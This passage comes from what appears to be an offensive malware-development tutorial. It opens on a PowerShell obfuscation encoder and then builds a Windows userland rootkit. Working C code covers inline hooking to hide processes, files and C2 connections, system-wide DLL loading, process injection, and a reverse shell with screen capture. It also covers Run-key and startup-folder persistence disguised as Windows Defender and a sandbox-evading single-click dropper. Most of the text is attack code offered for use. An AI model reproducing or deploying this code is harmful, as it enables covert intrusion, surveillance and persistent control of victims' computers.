    result = []
    chars = [c for c in ghost_text if c in GHOST_REVERSE]
    for i in range(0, len(chars), 2):
        high = GHOST_REVERSE[chars[i]]
        low = GHOST_REVERSE[chars[i + 1]]
        result.append((high << 4) | low)
    return bytes(result)


def make_ps_decoder(ghost_payload: str) -> str:
    code_points = [hex(ord(c)) for c in GHOST_ALPHABET]
    ps_alphabet = ','.join(f'[char]{cp}' for cp in code_points)

    return f"""$g=@'
{ghost_payload}
'@
$a=@({ps_alphabet})
$r=@{{}};for($x=0;$x -lt $a.Count;$x++){{$r[$a[$x]]=$x}}
$f=[char[]]$g|?{{$r.ContainsKey($_)}}
$b=New-Object byte[]($f.Count/2)
for($i=0;$i -lt $f.Count;$i+=2){{$b[$i/2]=[byte](($r[$f[$i]]*16)+$r[$f[$i+1]])}}
iex([System.Text.Encoding]::UTF8.GetString($b))"""


def ghost_encode_raw(code: str, output_path: str):
    ghost = encode_bytes(code.encode('utf-8'))
    stub = make_ps_decoder(ghost)
    with open(output_path, 'w', encoding='utf-8-sig') as f:
        f.write(stub)
    print(f"[GHOST] Encoded {len(code):,} chars → {output_path}")
    print(f"[GHOST] Invisible chars: {len(ghost):,}")


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--raw', type=str, help='Raw PowerShell code')
    parser.add_argument('--output', '-o', default='ghost.ps1')
    args = parser.parse_args()

    if args.raw:
        ghost_encode_raw(args.raw, args.output)
```

### 6.7 — Exercise: Encode and Execute

1. Create a test payload: `Write-Host "GHOST ACTIVE" -ForegroundColor Green`
2. Encode it: `python ghost_encode.py --raw "Write-Host 'GHOST ACTIVE' -ForegroundColor Green" -o test_ghost.ps1`
3. Open `test_ghost.ps1` in Notepad — it looks nearly empty
4. Run: `powershell -ep bypass -f test_ghost.ps1` — it prints "GHOST ACTIVE"

---

# PART III: ROOTKIT CORE — THE CLOAK

---

## Chapter 7: The x64 Inline Hook Engine

### 7.1 — What Is Inline Hooking?

Inline hooking is the technique of redirecting a function's execution by modifying its first instructions. When any program calls the hooked function, execution is redirected to our code instead.

```
BEFORE HOOK:
NtQuerySystemInformation:
    4C 8B D1        mov r10, rcx
    B8 36 00 00 00  mov eax, 36h
    ...

AFTER HOOK:
NtQuerySystemInformation:
    48 B8 XX XX XX XX XX XX XX XX  mov rax, <our_function>
    FF E0                          jmp rax
    (remaining bytes overwritten)
```

### 7.2 — The 12-Byte Absolute JMP

On x64, a direct jump to any address requires 12 bytes:

```asm
48 B8 <8 bytes>   ; mov rax, <64-bit address>
FF E0             ; jmp rax
```

This is our hook patch. It replaces the first 12 bytes of the target function with a jump to our replacement.

### 7.3 — The Trampoline

After hooking, we still need to call the original function (to get real results that we then filter). The trampoline preserves this ability:

```
Trampoline (allocated executable memory):
    <saved 12+ bytes from original function>
    48 B8 <address of original+12>   ; mov rax, <continue point>
    FF E0                            ; jmp rax
```

The trampoline contains the original bytes we overwrote, followed by a jump back to the rest of the original function. Calling the trampoline = calling the original function as if it was never hooked.

### 7.4 — Self-Contained Mode for NT Stubs

NT stubs (Nt* functions in ntdll.dll) are special. Their entire syscall sequence is only about 24 bytes. If we save all 24 bytes, the trampoline contains a complete, working syscall stub — it doesn't need to jump back to the original function at all.

```c
typedef struct _HOOK_ENTRY {
    void   *target;            // original function address
    void   *hook;              // our replacement function
    void   *trampoline;        // allocated: saved bytes + JMP back
    BYTE    saved_bytes[32];   // original bytes
    DWORD   save_size;         // bytes saved (instruction-boundary aligned)
    BOOL    self_contained;    // TRUE = full stub in trampoline, no JMP back
    BOOL    installed;
} HOOK_ENTRY;
```

### 7.5 — Hook Installation

```c
void hook_write_jmp(BYTE *dst, void *target) {
    dst[0] = 0x48;  // REX.W prefix
    dst[1] = 0xB8;  // mov rax, imm64
    *(void **)(dst + 2) = target;
    dst[10] = 0xFF; // jmp rax
    dst[11] = 0xE0;
}

BOOL hook_install(HOOK_ENTRY *h) {
    if (h->installed) return TRUE;

    // Save original bytes
    memcpy(h->saved_bytes, h->target, h->save_size);

    // Allocate executable memory for trampoline
    h->trampoline = VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE,
                                 PAGE_EXECUTE_READWRITE);
    if (!h->trampoline) return FALSE;

    // Build trampoline: saved bytes + JMP back (if not self-contained)
    memcpy(h->trampoline, h->saved_bytes, h->save_size);
    if (!h->self_contained) {
        hook_write_jmp((BYTE *)h->trampoline + h->save_size,
                       (BYTE *)h->target + h->save_size);
    }

    // Make target writable, write hook, restore protection
    DWORD old;
    VirtualProtect(h->target, h->save_size, PAGE_EXECUTE_READWRITE, &old);
    hook_write_jmp(h->target, h->hook);
    VirtualProtect(h->target, h->save_size, old, &old);

    h->installed = TRUE;
    return TRUE;
}

BOOL hook_remove(HOOK_ENTRY *h) {
    if (!h->installed) return TRUE;

    DWORD old;
    VirtualProtect(h->target, h->save_size, PAGE_EXECUTE_READWRITE, &old);
    memcpy(h->target, h->saved_bytes, h->save_size);
    VirtualProtect(h->target, h->save_size, old, &old);

    if (h->trampoline) {
        VirtualFree(h->trampoline, 0, MEM_RELEASE);
        h->trampoline = NULL;
    }

    h->installed = FALSE;
    return TRUE;
}
```

### 7.6 — Exercise: Hook MessageBoxA

Write a program that hooks `MessageBoxA` to change the message text:

```c
#include <windows.h>
#include <stdio.h>

typedef int (WINAPI *fn_MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT);
fn_MessageBoxA OrigMessageBox = NULL;

int WINAPI HookedMessageBox(HWND hWnd, LPCSTR lpText,
                            LPCSTR lpCaption, UINT uType) {
    return OrigMessageBox(hWnd, "HOOKED!", lpCaption, uType);
}

// ... install hook on MessageBoxA, set OrigMessageBox to trampoline
// ... call MessageBoxA("Hello") — it should display "HOOKED!"
```

This exercise teaches the hook pattern in a safe, visible way before applying it to NT functions.

---

## Chapter 8: Process Hiding

### 8.1 — How Windows Enumerates Processes

When you open Task Manager or call `CreateToolhelp32Snapshot`, the chain is:

```
Task Manager / tasklist.exe
    → NtQuerySystemInformation(SystemProcessInformation)
        → Kernel returns linked list of SYSTEM_PROCESS_INFORMATION
        → Each entry: process name, PID, thread count, memory usage
```

By hooking `NtQuerySystemInformation`, we intercept this linked list and remove entries for processes we want to hide.

### 8.2 — SYSTEM_PROCESS_INFORMATION Structure

```c
typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;     // 0 = last entry
    ULONG NumberOfThreads;
    LARGE_INTEGER Reserved[3];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;  // process name (e.g., "powershell.exe")
    LONG BasePriority;
    HANDLE UniqueProcessId;
    // ... more fields follow
} SYSTEM_PROCESS_INFORMATION;
```

This is a singly-linked list. Each entry's `NextEntryOffset` points to the next entry (as a byte offset from the current entry's start). The last entry has `NextEntryOffset = 0`.

### 8.3 — The Filter Algorithm

To hide a process, we unlink its entry from the list:

```c
NTSTATUS NTAPI HookedNtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    // Call original via trampoline — get real data
    NTSTATUS status = ((fn_NtQSI)hProcess.trampoline)(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength);

    if (status != 0 || SystemInformationClass != 5)
        return status;  // not process query, or failed — pass through

    SYSTEM_PROCESS_INFORMATION *prev = NULL;
    SYSTEM_PROCESS_INFORMATION *curr = (SYSTEM_PROCESS_INFORMATION *)SystemInformation;

    while (1) {
        // Check if this process should be hidden
        BOOL hide = FALSE;
        if (curr->ImageName.Buffer && curr->ImageName.Length > 0) {
            ULONG nameLen = curr->ImageName.Length / sizeof(WCHAR);
            hide = match_hidden_name(curr->ImageName.Buffer,
                                     nameLen, HIDDEN_PROCESSES);
        }

        if (hide) {
            if (prev == NULL) {
                // Hiding the FIRST entry — shift entire buffer
                if (curr->NextEntryOffset == 0) {
                    // Only entry — zero the whole buffer
                    break;
                }
                // Move everything forward
                ULONG remaining = SystemInformationLength - curr->NextEntryOffset;
                memmove(curr, (BYTE *)curr + curr->NextEntryOffset, remaining);
                continue;  // re-check current position
            } else {
                // Hiding a middle or last entry — adjust previous link
                if (curr->NextEntryOffset == 0) {
                    prev->NextEntryOffset = 0;  // prev becomes last
                } else {
                    prev->NextEntryOffset += curr->NextEntryOffset;
                }
            }
        } else {
            prev = curr;
        }

        if (curr->NextEntryOffset == 0) break;
        curr = (SYSTEM_PROCESS_INFORMATION *)((BYTE *)curr + curr->NextEntryOffset);
    }

    return status;
}
```

**Key edge cases:**
1. **Hiding the first entry:** Can't just adjust a previous link — there is no previous. Must shift the entire buffer forward.
2. **Hiding the last entry:** Set the previous entry's `NextEntryOffset` to 0.
3. **Hiding a middle entry:** Add the hidden entry's `NextEntryOffset` to the previous entry's — effectively skipping over it.

### 8.4 — Configuration

Hidden process names are defined in `cloak.h`:

```c
static const wchar_t *HIDDEN_PROCESSES[] = {
    L"vader_shell.exe",
    L"dark_room.exe",
    L"vader_implant.exe",
    L"vader_inject.exe",
    L"vader_stager.exe",
    L"cloak_loader.exe",
    NULL  // null-terminated array
};
```

### 8.5 — Exercise: Process Visibility Test

1. Start `notepad.exe` (a process you can see in Task Manager)
2. Add `L"notepad.exe"` to `HIDDEN_PROCESSES`
3. Compile the cloak DLL
4. Inject into `Taskmgr.exe`
5. Verify: notepad.exe disappears from the process list
6. Remove the entry and re-inject — notepad.exe reappears

---

## Chapter 9: File Hiding

### 9.1 — How Directory Listings Work

When you type `dir` in cmd.exe or open a folder in Explorer:

```
Explorer / cmd.exe / dir
    → NtQueryDirectoryFile(handle, FileInformationClass, ...)
        → Kernel returns linked list of directory entries
        → Each entry: filename, size, timestamps
```

### 9.2 — Multiple FileInformationClass Values

`NtQueryDirectoryFile` uses different structures depending on the `FileInformationClass` parameter:

| Class | Value | Structure | Used By |
|-------|-------|-----------|---------|
| FileDirectoryInformation | 1 | Basic listing | Legacy apps |
| FileFullDirectoryInformation | 2 | Extended listing | Some apps |
| FileBothDirectoryInformation | 3 | Names + short names | Explorer, cmd |
| FileIdBothDirectoryInformation | 37 | With file IDs | Modern Explorer |

All four share the same first two fields: `NextEntryOffset` and `FileIndex`. The filename and its length are at different offsets.

### 9.3 — Layout Abstraction

Instead of writing four separate filters, we use a struct that describes where the filename lives in each format:

```c
typedef struct _DIR_LAYOUT {
    ULONG next_offset;    // offset of NextEntryOffset field (always 0)
    ULONG name_offset;    // offset of FileName field
    ULONG name_len_offset; // offset of FileNameLength field
} DIR_LAYOUT;

static DIR_LAYOUT get_layout(ULONG info_class) {
    DIR_LAYOUT l = {0};
    switch (info_class) {
        case 1:  l.name_offset = 64; l.name_len_offset = 56; break;
        case 2:  l.name_offset = 68; l.name_len_offset = 56; break;
        case 3:  l.name_offset = 94; l.name_len_offset = 56; break;
        case 37: l.name_offset = 104; l.name_len_offset = 56; break;
    }
    return l;
}
```

### 9.4 — The File Filter

```c
NTSTATUS NTAPI HookedNtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan)
{
    NTSTATUS status = /* call original via trampoline */;

    if (status != 0) return status;

    // Only filter supported classes
    if (FileInformationClass != 1 && FileInformationClass != 2 &&
        FileInformationClass != 3 && FileInformationClass != 37)
        return status;

    DIR_LAYOUT layout = get_layout(FileInformationClass);
    BYTE *prev = NULL;
    BYTE *curr = (BYTE *)FileInformation;

    while (1) {
        ULONG nextOff = *(ULONG *)(curr + layout.next_offset);
        ULONG nameLen = *(ULONG *)(curr + layout.name_len_offset);
        WCHAR *name = (WCHAR *)(curr + layout.name_offset);
        ULONG nameChars = nameLen / sizeof(WCHAR);

        if (match_hidden_name(name, nameChars, HIDDEN_FILES)) {
            if (prev == NULL && nextOff == 0) {
                // Only entry — zero the status block
                IoStatusBlock->Information = 0;
                return 0x80000006; // STATUS_NO_MORE_FILES
            }
            if (prev == NULL) {
                // First entry — shift buffer
                memmove(curr, curr + nextOff, Length - nextOff);
                continue;
            }
            if (nextOff == 0) {
                *(ULONG *)(prev + layout.next_offset) = 0;
                break;
            }
            *(ULONG *)(prev + layout.next_offset) += nextOff;
        } else {
            prev = curr;
        }

        if (nextOff == 0) break;
        curr += nextOff;
    }

    return status;
}
```

### 9.5 — Exercise: File Visibility Test

1. Create a test file: `echo test > C:\Windows\Temp\test_hidden.txt`
2. Add `L"test_hidden.txt"` to `HIDDEN_FILES` in cloak.h
3. Recompile and inject into cmd.exe
4. Run `dir C:\Windows\Temp\test_hidden.txt` — file should appear to not exist
5. But `type C:\Windows\Temp\test_hidden.txt` still works (we didn't hook NtReadFile)

---

## Chapter 10: Connection Hiding

### 10.1 — How netstat Works

`netstat -ano` queries the TCP connection table through `iphlpapi.dll`:

```
netstat.exe
    → GetExtendedTcpTable() (iphlpapi.dll)
        → Returns MIB_TCPTABLE_OWNER_PID
        → Each row: local addr:port, remote addr:port, state, owning PID
```

### 10.2 — The Hook Target

Unlike process and file hiding (which hook ntdll functions), connection hiding hooks `GetExtendedTcpTable` in `iphlpapi.dll`:

```c
NTSTATUS NTAPI HookedGetExtendedTcpTable(
    PVOID pTcpTable,
    PDWORD pdwSize,
    BOOL bOrder,
    ULONG ulAf,
    ULONG TableClass,
    ULONG Reserved)
{
    DWORD status = /* call original via trampoline */;
    if (status != 0) return status;

    // Only filter tables that include PID info
    if (TableClass != 5 && TableClass != 4) // TCP_TABLE_OWNER_PID_*
        return status;

    MIB_TCPTABLE_OWNER_PID *table = (MIB_TCPTABLE_OWNER_PID *)pTcpTable;
    DWORD write = 0;

    for (DWORD i = 0; i < table->dwNumEntries; i++) {
        MIB_TCPROW_OWNER_PID *row = &table->table[i];

        // Check if this connection uses our C2 port
        if (ntohs((u_short)row->dwLocalPort) == HIDDEN_C2_PORT ||
            ntohs((u_short)row->dwRemotePort) == HIDDEN_C2_PORT)
            continue;  // skip (hide) this entry

        // Keep this entry — copy forward if needed
        if (write != i)
            memcpy(&table->table[write], row, sizeof(MIB_TCPROW_OWNER_PID));
        write++;
    }

    table->dwNumEntries = write;
    return status;
}
```

### 10.3 — Port-Based Filtering

We filter by port number rather than IP address. This is simpler and catches both sides of the connection (local port for listeners, remote port for outbound C2).

```c
#define HIDDEN_C2_PORT 4444
```

### 10.4 — Exercise: Connection Visibility Test

1. Start a listener: `python -c "import socket;s=socket.socket();s.bind(('0.0.0.0',4444));s.listen();s.accept()"`
2. Verify: `netstat -ano | findstr 4444` — connection visible
3. Inject cloak into the cmd.exe running netstat
4. Verify: `netstat -ano | findstr 4444` — connection invisible

---

## Chapter 11: System-Wide Deployment via SetWindowsHookEx

### 11.1 — The Problem with Per-Process Injection

Injecting cloak.dll into individual processes (one by one) is tedious and incomplete. A new process starts — it can see everything. We need system-wide deployment.

### 11.2 — CBT Hooks

Windows has a global hook mechanism: `SetWindowsHookEx`. The `WH_CBT` (Computer-Based Training) hook fires on window creation, activation, and focus changes. Setting thread ID to 0 makes it system-wide.

When you install a system-wide CBT hook backed by a DLL, Windows automatically loads that DLL into every GUI process. Our DLL's `DllMain(DLL_PROCESS_ATTACH)` fires in each process, installing the inline hooks.

### 11.3 — The Cloak DLL Entry Point

```c
#include "hook_engine.h"
#include "cloak.h"

static HOOK_ENTRY hProcess;  // NtQuerySystemInformation hook
static HOOK_ENTRY hFile;     // NtQueryDirectoryFile hook
static HOOK_ENTRY hConn;     // GetExtendedTcpTable hook

// Forward declarations of hook functions
NTSTATUS NTAPI HookedNtQSI(ULONG, PVOID, ULONG, PULONG);
NTSTATUS NTAPI HookedNtQDF(HANDLE, HANDLE, PVOID, PVOID,
    PVOID, PVOID, ULONG, ULONG, BOOLEAN, PVOID, BOOLEAN);
DWORD WINAPI HookedGETT(PVOID, PDWORD, BOOL, ULONG, ULONG, ULONG);

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);

        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        HMODULE iphlp = LoadLibraryA("iphlpapi.dll");

        // Setup process hiding hook
        hProcess.target = GetProcAddress(ntdll, "NtQuerySystemInformation");
        hProcess.hook = HookedNtQSI;
        hProcess.save_size = 24;
        hProcess.self_contained = TRUE;  // NT stub — full copy
        hook_install(&hProcess);

        // Setup file hiding hook
        hFile.target = GetProcAddress(ntdll, "NtQueryDirectoryFile");
        hFile.hook = HookedNtQDF;
        hFile.save_size = 24;
        hFile.self_contained = TRUE;
        hook_install(&hFile);

        // Setup connection hiding hook
        if (iphlp) {
            hConn.target = GetProcAddress(iphlp, "GetExtendedTcpTable");
            hConn.hook = HookedGETT;
            hConn.save_size = 16;
            hConn.self_contained = FALSE;  // not an NT stub
            hook_install(&hConn);
        }
    }
    return TRUE;
}

// The CBT hook proc — does nothing, exists only to trigger DLL loading
__declspec(dllexport) LRESULT CALLBACK CloakHookProc(
    int nCode, WPARAM wParam, LPARAM lParam)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
```

### 11.4 — The Loader

A small executable installs the global hook:

```c
#include <windows.h>
#include <stdio.h>

int main(void) {
    HMODULE hDll = LoadLibraryA("cloak.dll");
    if (!hDll) { printf("[-] Cannot load cloak.dll\n"); return 1; }

    HOOKPROC proc = (HOOKPROC)GetProcAddress(hDll, "CloakHookProc");
    if (!proc) { printf("[-] Cannot find CloakHookProc\n"); return 1; }

    HHOOK hHook = SetWindowsHookExA(WH_CBT, proc, hDll, 0);
    if (!hHook) { printf("[-] Hook failed: %lu\n", GetLastError()); return 1; }

    printf("[+] CLOAK ACTIVE — system-wide concealment engaged\n");
    printf("[*] Press ENTER to unhook and exit...\n");
    getchar();

    UnhookWindowsHookEx(hHook);
    printf("[+] Hooks removed\n");
    return 0;
}
```

### 11.5 — Demo Sequence

```
Step 1: Start vader_shell.exe (visible)
Step 2: Run "tasklist | findstr vader" — vader_shell.exe visible
Step 3: Run "dir" in vader directory — all files visible
Step 4: Run "netstat -ano | findstr 4444" — C2 connection visible
Step 5: Run cloak_loader.exe
Step 6: Run "tasklist | findstr vader" — NOTHING
Step 7: Run "dir" — vader files GONE
Step 8: Run "netstat -ano | findstr 4444" — connection GONE
Step 9: Press ENTER in loader — everything visible again
```

---

# PART IV: OFFENSIVE OPERATIONS

---

## Chapter 12: Process Injection

### 12.1 — Classic DLL Injection

The standard injection chain:
1. Open target process (`OpenProcess`)
2. Allocate memory in target (`VirtualAllocEx`)
3. Write DLL path to allocated memory (`WriteProcessMemory`)
4. Create remote thread that calls `LoadLibrary` with our DLL path (`CreateRemoteThread`)

### 12.2 — The IAT Problem (Again)

These four functions — `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread` — are the classic injection signature. All four in one binary = instant Defender flag.

**Solution:** Dynamic API resolution with XOR-encoded names, exactly as Chapter 3 taught.

### 12.3 — Suspended Process Injection

Even cleaner than injecting into a running process: spawn a new process in a suspended state, inject before it ever runs, then resume it.

```c
// Create suspended process
STARTUPINFOA si = {sizeof(si)};
PROCESS_INFORMATION pi = {0};
CreateProcessA(NULL, "powershell.exe", NULL, NULL, FALSE,
    CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

// Inject DLL into the suspended process
// ... VirtualAllocEx, WriteProcessMemory, CreateRemoteThread with LoadLibraryA ...

// Resume — process starts with our DLL already loaded
ResumeThread(pi.hThread);
```

**Why this is better:** The process never executes a single instruction of its own code before our DLL is loaded. If the DLL installs the Dark Room (AMSI/ETW bypass), the process is blind from its very first breath.

### 12.4 — Remote Export Resolution

After injecting a DLL, we might want to call specific functions in it (like an init or a watchdog start). We can't use `GetProcAddress` on a remote process directly. Instead:

1. Load the DLL locally (with `DONT_RESOLVE_DLL_REFERENCES` — don't run DllMain)
2. Find the export's offset: `export_offset = (DWORD_PTR)GetProcAddress(hLocal, "VdrInit") - (DWORD_PTR)hLocal`
3. Calculate remote address: `remote_addr = (DWORD_PTR)hRemoteModule + export_offset`
4. Call it via `CreateRemoteThread` pointing at `remote_addr`

```c
// Load locally without executing DllMain
HMODULE hLocal = LoadLibraryExA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);

// Get local address of the init function
FARPROC pLocalInit = GetProcAddress(hLocal, "VdrInit");

// Calculate offset from DLL base
DWORD_PTR offset = (DWORD_PTR)pLocalInit - (DWORD_PTR)hLocal;

// Apply to remote base address
DWORD_PTR pRemoteInit = (DWORD_PTR)hRemoteModule + offset;

// Call remotely
CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)pRemoteInit, NULL, 0, NULL);

FreeLibrary(hLocal);
```

### 12.5 — Exercise: Benign DLL Injection

Create a simple DLL that displays a message box when loaded:

```c
// test_inject.dll
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH)
        MessageBoxA(NULL, "Injected!", "Test", MB_OK);
    return TRUE;
}
```

Write an injector that injects this DLL into Notepad. Verify the message box appears.

---

## Chapter 13: Reverse Shell Engineering

### 13.1 — What Is a Reverse Shell?

A reverse shell is a program on the target machine that connects back to the attacker's machine, providing a command prompt over the network. "Reverse" because the target initiates the connection — this bypasses firewall rules that block inbound connections.

### 13.2 — Socket Fundamentals

```c
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

// Initialize Winsock
WSADATA wsa;
WSAStartup(MAKEWORD(2, 2), &wsa);

// Create TCP socket
SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

// Connect to attacker
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
addr.sin_addr.s_addr = inet_addr("192.168.1.100");
connect(sock, (struct sockaddr *)&addr, sizeof(addr));
```

### 13.3 — cmd.exe Pipe Redirection

The shell works by spawning `cmd.exe` with its stdin/stdout/stderr redirected to the socket:

```c
STARTUPINFOA si;
memset(&si, 0, sizeof(si));
si.cb = sizeof(si);
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdInput  = (HANDLE)sock;
si.hStdOutput = (HANDLE)sock;
si.hStdError  = (HANDLE)sock;

PROCESS_INFORMATION pi;
CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
```

Everything typed on the attacker's side goes to cmd.exe's stdin. Everything cmd.exe outputs goes back over the socket.

### 13.4 — Auto-Reconnect

Network connections drop. The shell must reconnect automatically:

```c
while (1) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (connect(sock, ...) == 0) {
        // Connected — start shell
        spawn_cmd(sock);
        closesocket(sock);
    }
    // Random sleep between 5-30 seconds (jitter)
    Sleep((rand() % 25 + 5) * 1000);
}
```

The random jitter prevents a predictable reconnection pattern that network monitoring tools could detect.

### 13.5 — Screen Capture

The shell includes a `screen` command that captures the target's display:

```c
void capture_screen(SOCKET sock) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMemDC, hBmp);

    // Capture screen contents
    BitBlt(hMemDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    // Build BMP header
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;  // negative = top-down
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    // Get pixel data
    int stride = ((w * 3 + 3) & ~3);
    int dataSize = stride * h;
    BYTE *pixels = (BYTE *)VirtualAlloc(NULL, dataSize, MEM_COMMIT, PAGE_READWRITE);
    GetDIBits(hMemDC, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    // Send over socket in chunks
    BITMAPFILEHEADER bf = {0};
    bf.bfType = 0x4D42;  // "BM"
    bf.bfSize = sizeof(bf) + sizeof(bi) + dataSize;
    bf.bfOffBits = sizeof(bf) + sizeof(bi);

    send(sock, (char *)&bf, sizeof(bf), 0);
    send(sock, (char *)&bi, sizeof(bi), 0);

    for (int off = 0; off < dataSize; off += 4096)
        send(sock, (char *)pixels + off, min(4096, dataSize - off), 0);

    VirtualFree(pixels, 0, MEM_RELEASE);
    DeleteObject(hBmp);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreen);
}
```

### 13.6 — Exercise: Local Shell Test

1. Start a listener: `python -c "import socket;s=socket.socket();s.bind(('127.0.0.1',4444));s.listen();c,a=s.accept();..."`
2. Compile the reverse shell pointing to 127.0.0.1:4444
3. Run the shell — verify you get a command prompt through the listener

---

## Chapter 14: Persistence

### 14.1 — HKCU Run Key

The simplest persistence mechanism — survives reboots, no admin required:

```c
// Copy self to AppData
char src[MAX_PATH], dst[MAX_PATH];
GetModuleFileNameA(NULL, src, MAX_PATH);
snprintf(dst, MAX_PATH, "%s\\Microsoft\\Windows\\svchost_update.exe",
    getenv("APPDATA"));
CopyFileA(src, dst, FALSE);

// Add Run key
HKEY hKey;
RegOpenKeyExA(HKEY_CURRENT_USER,
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0, KEY_SET_VALUE, &hKey);
RegSetValueExA(hKey, "SecurityHealthSystray", 0, REG_SZ,
    (BYTE *)dst, strlen(dst) + 1);
RegCloseKey(hKey);
```

**Why "SecurityHealthSystray"?** It looks like a Windows Defender component. An administrator glancing at startup items sees what appears to be a legitimate Windows process.

### 14.2 — Startup Folder Shortcut

A backup persistence mechanism:

```c
char startup[MAX_PATH];
SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
strcat(startup, "\\WindowsSecurityHealth.lnk");

// Create .lnk file using COM
IShellLink *psl;
CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
    &IID_IShellLink, (void **)&psl);
psl->SetPath(dst);
psl->SetShowCmd(SW_HIDE);
// ... save via IPersistFile ...
```

### 14.3 — Redundancy

The dropper installs BOTH mechanisms. If one is discovered and removed, the other fires on next reboot. The admin must find and remove both simultaneously — or the implant reinstalls itself.

---

## Chapter 15: The Single-Click Dropper

### 15.1 — Architecture

The dropper is the culmination of everything built so far. One executable that executes the entire kill chain:

```
vader_dropper.exe
│
├── 1. Sandbox Detection
│   ├── Check RAM > 2GB
│   ├── Check CPU count > 1
│   └── Sleep timing verification
│
├── 2. Dynamic API Resolution
│   └── XOR decode → GetProcAddress → zero
│
├── 3. Dark Room Activation
│   ├── VEH handler registered
│   ├── DR0 → AmsiScanBuffer (E_INVALIDARG)
│   └── DR1 → EtwEventWrite (return 0)
│
├── 4. Cloak Deployment
│   ├── Extract cloak.dll from embedded payload
│   ├── Write to temp directory
│   ├── LoadLibrary → hooks install
│   └── SetWindowsHookEx(WH_CBT) → system-wide
│
├── 5. Persistence
│   ├── Copy self to AppData
│   ├── HKCU Run key
│   └── Startup folder shortcut
│
├── 6. C2 Notification
│   └── TCP callback to operator (hostname, cloak status, shell port)
│
├── 7. Reverse Shell
│   ├── Connect to C2 IP:PORT
│   ├── cmd.exe with redirected I/O
│   ├── Screen capture command
│   └── Auto-reconnect with jitter
│
└── 8. Cleanup on Exit
    └── Remove temp files
```

### 15.2 — Sandbox Detection

Before doing anything suspicious, check if we're running in an analysis sandbox:

```c
BOOL is_sandbox(void) {
    // Check 1: RAM — sandboxes typically allocate minimal memory
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024))  // < 2GB
        return TRUE;

    // Check 2: CPU count — sandboxes often have 1 CPU
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)
        return TRUE;

    // Check 3: Sleep timing — sandboxes may fast-forward sleeps
    DWORD t1 = GetTickCount();
    Sleep(1000);
    DWORD elapsed = GetTickCount() - t1;
    if (elapsed < 900)  // sleep was accelerated
        return TRUE;

    return FALSE;
}
```

If any check triggers, the dropper exits silently — producing no malicious behaviour for the sandbox to record.

### 15.3 — Embedded Cloak Payload

The cloak DLL is embedded in the dropper as a C byte array (generated by a build script):

```c
// cloak_payload.h (auto-generated)
static const unsigned char CLOAK_DLL_DATA[] = {
    0x4D, 0x5A, 0x90, 0x00, ...  // MZ header
    // ... entire cloak.dll as bytes ...
};
static const unsigned int CLOAK_DLL_SIZE = 45056;
```

At runtime:
```c
char temp[MAX_PATH], dllPath[MAX_PATH];
GetTempPathA(MAX_PATH, temp);
snprintf(dllPath, MAX_PATH, "%scloak.dll", temp);

// Write embedded DLL to disk
HANDLE hFile = CreateFileA(dllPath, GENERIC_WRITE, 0, NULL,
    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
WriteFile(hFile, CLOAK_DLL_DATA, CLOAK_DLL_SIZE, &written, NULL);
CloseHandle(hFile);

// Load it — DllMain installs hooks
LoadLibraryA(dllPath);
```

---

# PART V: ADVANCED EVASION

---

## Chapter 16: Indirect Syscalls — The Gate Engine

### 16.1 — The User-Mode Hook Problem

EDR products hook ntdll.dll functions by patching their first bytes. When you call `NtAllocateVirtualMemory`, you actually jump into the EDR's inspection code first. The EDR decides whether to allow or block the call.

```
